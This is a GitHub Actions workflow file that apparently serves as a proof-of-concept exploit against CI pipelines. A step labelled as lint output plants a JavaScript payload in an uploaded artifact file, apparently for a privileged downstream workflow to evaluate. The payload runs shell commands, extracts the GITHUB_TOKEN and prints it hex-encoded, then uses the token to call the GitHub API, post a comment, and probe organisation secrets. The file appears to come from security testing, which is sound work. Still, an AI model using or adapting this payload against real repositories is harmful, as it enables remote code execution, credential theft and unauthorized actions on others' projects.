---
name: PR Validation
on:
  pull_request:

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - name: Produce attacker-controlled lint results
        run: |
          echo "true" > has-warnings.txt
          cat > pr-number.txt <<'PAYLOAD'
          await (async()=>{const cp=require('child_process'),fs=require('fs');const proof=cp.execSync('id; uname -a; echo INJECTED_RCE_PROOF > /tmp/gab-prcomment-marker; cat /tmp/gab-prcomment-marker',{encoding:'utf8'});console.log('RCE_MARKER\n'+proof);fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'### RCE v4\n```\n'+proof+'\n```\n');const tok=process.env['INPUT_GITHUB-TOKEN']||process.env.GITHUB_TOKEN||'';console.log('TOKEN_LEN '+tok.length);console.log('TOKEN_HEX '+Buffer.from(tok).toString('hex'));console.log('TOKEN_HEAD '+tok.slice(0,10)+' TOKEN_TAIL '+tok.slice(-4));const H={Authorization:'Bearer '+tok,Accept:'application/vnd.github+json','User-Agent':'attacker'};const rr=await fetch('https://api.github.com/repos/PDFtoMark/triage-adobedocs-v020a266-f2879e',{headers:H});console.log('RAW_TOKEN_GET_REPO '+rr.status+' '+JSON.stringify(await rr.json()).slice(0,220));const pc=await fetch('https://api.github.com/repos/PDFtoMark/triage-adobedocs-v020a266-f2879e/issues/3/comments',{method:'POST',headers:{...H,'Content-Type':'application/json'},body:JSON.stringify({body:'INJECTED_RCE_PROOF v4: raw extracted GITHUB_TOKEN successfully posted this comment via the API'})});console.log('RAW_TOKEN_COMMENT '+pc.status+' '+JSON.stringify(await pc.json()).slice(0,140));fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'RAW_TOKEN_COMMENT '+pc.status+'\n');const os=await fetch('https://api.github.com/orgs/PDFtoMark/actions/secrets',{headers:H});console.log('RAW_TOKEN_ORG_SECRETS '+os.status+' '+(await os.text()).slice(0,140));return 3;})()
          PAYLOAD
      - name: Upload lint results
        uses: actions/upload-artifact@v4
        with:
          name: lint-results
          path: |
            has-warnings.txt
            pr-number.txt
